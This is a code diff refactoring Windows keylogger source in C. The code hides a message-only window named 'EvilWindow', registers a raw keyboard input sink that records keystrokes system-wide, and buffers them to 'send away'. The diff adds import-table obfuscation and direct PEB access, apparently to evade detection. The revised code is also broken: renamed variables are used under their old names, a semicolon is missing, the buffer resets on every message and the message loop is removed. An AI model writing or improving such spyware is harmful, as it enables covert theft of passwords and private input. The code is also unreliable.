@@ -1,35 +1,48 @@
 #include <Windows.h>
-#include "IATfuscation.c"
+#include "IATfuscation.h"
 
-#define KEYCODEBUFFER_SIZE 1024 // Constant for maximum size of the vkCode buffer
+#define VKCODE_BUFFER_MAX_SIZE 1024 
 
-// We will store vkCodes into an array and send it away when it's full. Simple, shouldn't generate too much traffic
-UINT KeyCodes[KEYCODEBUFFER_SIZE] = { 0 };
-SIZE_T Index = 0;
-
-const char WindowClassName[] = "EvilWindow"; // Because I'm an evil bastard! >:D
-
-// credit to vx-underground for the below
-
-// Window procedure of our message-only window
-LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
+VOID ZeroMemory(PVOID destination, SIZE_T size)
 {
-    static HANDLE hLog;
-    UINT dwSize;
-    RAWINPUTDEVICE rid;
-    RAWINPUT* buffer;
+    PULONG dest = (PULONG)destination;
+    SIZE_T count = size / sizeof(ULONG);
+
+    while (count > 0)
+    {
+        *dest = 0;
+        dest++;
+        count--;
+    }
+
+    return;
+}
+
+LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
+{   
+    RAWINPUTDEVICE raw_input_device
+    static HANDLE  handle;
+    RAWINPUT*      buffer;
+    UINT           u_size;
+ /*
+ *  We will store vkCodes into an array and send it away when it's full.
+ *  Simple, shouldn't generate too much traffic
+ */
+    UINT key_codes[VKCODE_BUFFER_MAX_SIZE] = { 0 };
+    SIZE_T index = 0;
+
 
     switch (msg)
     {
     case WM_CREATE:
-        // Register a raw input device to capture keyboard input
-        rid.usUsagePage = 0x01;
-        rid.usUsage = 0x06;
-        rid.dwFlags = RIDEV_INPUTSINK;
-        rid.hwndTarget = hwnd;
+        
+        raw_input_device.usUsagePage = 0x01;
+        raw_input_device.usUsage = 0x06;
+        raw_input_device.dwFlags = RIDEV_INPUTSINK;
+        raw_input_device.hwndTarget = hwnd;
 
     case WM_INPUT:
-        // request size of the raw input buffer to dwSize
+        
         GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &dwSize,
             sizeof(RAWINPUTHEADER));
 
@@ -41,7 +54,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
         {
             // if this is keyboard message and WM_KEYDOWN, log the key
             if (buffer->header.dwType == RIM_TYPEKEYBOARD && buffer->data.keyboard.Message == WM_KEYDOWN)
-            {   
+            {
                 // Check if the array has space for another key
                 if (Index < KEYCODEBUFFER_SIZE)
                 {
@@ -61,11 +74,11 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 
     case WM_DESTROY:
         // Change the RAWINPUTDEVICE structure in order to remove the device
-        rid.dwFlags = RIDEV_REMOVE; // Remove the device flag
-        rid.hwndTarget = NULL; // No longer interested in messages from the device
+        raw_input_device.dwFlags = RIDEV_REMOVE; // Remove the device flag
+        raw_input_device.hwndTarget = NULL; // No longer interested in messages from the device
 
         // Call RegisterRawInputDevices to unregister the device
-        BOOL result = RegisterRawInputDevices(&rid, 1, sizeof(RAWINPUTDEVICE));
+        BOOL result = RegisterRawInputDevices(&raw_input_device, 1, sizeof(RAWINPUTDEVICE));
 
         PostQuitMessage(0);
         break;
@@ -77,35 +90,29 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 }
 
 
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
+int WINAPI WinMain(HINSTANCE h_instance, HINSTANCE h_prev_instance, LPSTR lp_cmd_line, int n_cmd_show)
 {
-    WNDCLASSEX wc;
-    HWND hwnd;
-    MSG msg;
 
-    // register window class
-    ZeroMemory(&wc, sizeof(WNDCLASSEX));
-    wc.cbSize = sizeof(WNDCLASSEX);
-    wc.lpfnWndProc = WndProc;
-    wc.hInstance = hInstance;
-    wc.lpszClassName = WindowClassName;
+#ifdef _WIN64
+    PPEB peb = (PEB*)(__readgsqword(0x60));
+#elif _WIN32
+    PPEB peb = (PEB*)(__readfsdword(0x30));
+#endif
 
-    // create message-only window
-    hwnd = CreateWindowEx(
-        0,
-        WindowClassName,
-        NULL,
-        0,
-        0, 0, 0, 0,
-        HWND_MESSAGE, NULL, hInstance, NULL
-    );
+    WNDCLASSEXW window_class;
+    WCHAR       window_class_name[] = "EvilWindow"; // Because I'm an evil bastard! >:D
+    HWND        window_handle;
+    MSG         msg;
 
-    // the message loop
-    while (GetMessage(&msg, NULL, 0, 0) > 0)
+    RtlZeroMemoryInternal(&window_class, sizeof(window_class));
+
+    window_class.cbSize = sizeof(WNDCLASSEXW);
+    window_class.lpfnWndProc = Wndproc;
+    window_class.hInstance = hInstance;
+    window_class.lpszClassName = &window_class_name; 
+
+    if (!RegisterClassExW(&window_class))
     {
-        TranslateMessage(&msg);
-        DispatchMessage(&msg);
+        return 1;
     }
-
-    return msg.wParam;
 }
